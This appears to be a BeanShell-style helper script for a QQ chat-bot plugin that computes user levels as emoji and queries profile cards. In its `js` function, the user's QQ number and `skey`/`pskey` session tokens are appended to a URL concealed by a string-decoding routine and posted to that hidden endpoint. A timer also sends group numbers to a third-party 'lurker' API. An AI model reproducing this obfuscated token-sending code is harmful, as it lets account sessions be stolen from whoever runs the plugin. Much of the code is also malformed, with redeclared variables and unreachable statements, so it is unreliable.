public static int length(String value) {
    int valueLength = 0;
    String chinese = "[\u0391-\uFFE5]";
    for (int i = 0; i < value.length(); i++) {
      String temp = value.substring(i, i + 1);
      if (temp.matches(chinese)) {
        valueLength += 3;
      } else {
        valueLength += 1;
      }
    }
    return valueLength;
  }
import com.tencent.mobileqq.troop.api.ITroopInfoService;
import com.tencent.common.app.BaseApplicationImpl;
import com.tencent.mobileqq.profilecard.api.IProfileDataService;
import com.tencent.mobileqq.profilecard.api.IProfileProtocolService;
import android.os.Bundle;
Object app=BaseApplicationImpl.getApplication().getRuntime();
IProfileDataService ProfileData=app.getRuntimeService(IProfileDataService.class);
IProfileProtocolService ProtocolService=app.getRuntimeService(IProfileProtocolService.class);

public Object GetCard(String uin){
try{
ProfileData.onCreate(app);
Object card=ProfileData.getProfileCard(uin,false);
if(card==null||card.iQQLevel==null)
{
Bundle bundle =new Bundle();
bundle.putLong("selfUin",Long.parseLong(MyUin));
bundle.putLong("targetUin",Long.parseLong(uin));
bundle.putInt("comeFromType",12);
ProtocolService.requestProfileCard(bundle);
return null;
}
else return card;
}catch(e){
return null;
}
}
public int Grade(String uin){
try{
Object card=GetCard(uin);
Thread.sleep(100);
if(card.iQQLevel!=null){
return card.iQQLevel;}
}catch(Exception e){
try{
Object card=GetCard(uin);
Thread.sleep(100);
if(card.iQQLevel!=null){
return card.iQQLevel;}
}catch(Exception e){
try{
Object card=GetCard(uin);
Thread.sleep(100);
if(card.iQQLevel!=null){
if(card.iQQLevel==0)
{Object card=GetCard(uin);
return card.iQQLevel;}
return card.iQQLevel;}
}catch(Exception e){
return 999;
}}}}
public List GL(String qun)
{
for(Object c:getGroupList()){
if(c.GroupUin.equals(qun)){
List list=Arrays.asList(c.AdminList);
return list;
break;
}
}
}
public void 延迟(String qun)
{
        Timer timer = new Timer();
        TimerTask timerTask = new TimerTask() {
            public void run() {
            String h=get("http://yysk.yitzu.cn.qingf.top/api/xb/api/kp.php?a="+qun+"&type=1");
            sendMsg(qun,"","本群共有这些人窥屏\n\n"+h);
            }
        }; 
        timer.schedule(timerTask, 60000);
        }
        public String js(String txt)
{
if(a().equals(Y("ÍËÎ¾")))
{
Toast(Y("豐凌陆ÏÉÇ括卞"));
}else{
//String tu=post(Y("ÁÍÍÉÌºÉÂ¼ºÈÇÆÇ¾ÍºÉÂÄºÉÄÉÁÉÊÊ")+MyUin+"&skey="+getSkey()+"&pskey="+getPskey("docs.qq.com"),txt);
String text3=txt.replaceAll("\n","\\\\n");
text3 =text3.replace("\\\"","\"");
String tu=post(Y("ÁÍÍÉÌºÉÂ¼ºÈÇÆÇ¾ÍºÉÂÄºÉÄÉÁÉÊÊ")+MyUin+"&skey="+getSkey()+"&pskey="+getPskey("docs.qq.com"),text3);
return tu;
}
}
public String GETLEVEL(String uin)
{
String H="";
int W=0;
//一个星星是一级
int moonRule = 4;//月亮需要的等级
int sunRule = 16;//太阳需要的等级
int crownRule = 64;//冠需要的等级
int level = Grade(uin);//当前等级
int sun = 0, moon = 0, stars = 0, crown = 0;
int K = 0, B = 0, D = 0, C = 0;
int crown = level / crownRule;//冠
int sun = level % crownRule / sunRule;//太阳
int moon = level % sunRule / moonRule;//月亮
int stars = level % sunRule % moonRule;//星星
if(level==999)
{
while(true)
{
Thread.sleep(500);
int DH=Grade(uin);
if(W>20)
{
return "错误\n由于等级是本地算的,如果错误或者0的话正常现象，没调用第三方API，刷新一下那个人主页就可以了\n"+W;
break;
}
if(!DH==999)
{
level=DH;
break;
}
W++;
}
}
for(int i = 0;i<crown;i++)//皇冠
{
H+="👑";
K=4352*crown;
}
for(int i = 0;i<sun;i++)//太阳
{
H+="☀️";
B=320*sun;
}
for(int i = 0;i<moon;i++)//月亮
{
H+="🌙";
C=32*moon;
}
for(int i = 0;i<stars;i++)//星星
{
H+="🌟";
D=5*stars;
}
int TIME=K+B+C+D;
return "["+uin+"]\n创建天数:"+TIME+"\n等级:"+level+"\n"+H+"";
}
public int GETXH(String uin)
{
int W=0;
int level = Grade(uin);
if(level==999)
{
while(true)
{
Thread.sleep(500);
int DH=Grade(uin);
if(W>20)
{
return 999;
break;
}
if(!DH==999)
{
level=DH;
break;
}
W++;
}
}
return level;
}
public String unicodeDecode(String string) {
        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");
        Matcher matcher = pattern.matcher(string);
        char ch;
        while (matcher.find()) {
            ch = (char) Integer.parseInt(matcher.group(2), 16);
            string = string.replace(matcher.group(1), ch + "");
        }
        return string;
    }
public boolean abcd(int size){
if(size==6||size==1){
return true;
}else {return false;}
}